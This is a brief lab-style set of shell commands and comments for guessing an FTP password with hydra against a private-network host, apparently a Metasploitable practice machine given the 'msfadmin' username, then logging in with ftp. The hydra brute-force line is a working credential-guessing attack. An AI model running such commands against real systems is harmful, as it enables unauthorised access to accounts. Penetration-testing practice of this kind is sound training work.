# To attack the server, first create a directory 
# Make a file with guessed password
# Save it
# Use hydra to initial attack with guessing passwords
# Note the successful logged password
# run ftp and verify the credencial and make log in


mkdir Labwork
cd Labwork/
vim guessed_password.txt
# Add guessed passwords to the file
# Save and exit the file
hydra -l msfadmin -P guessed_password.txt -t 1 -f -v ftp://192.168.56.20
ftp 192.168.56.20
# Provide username and password 

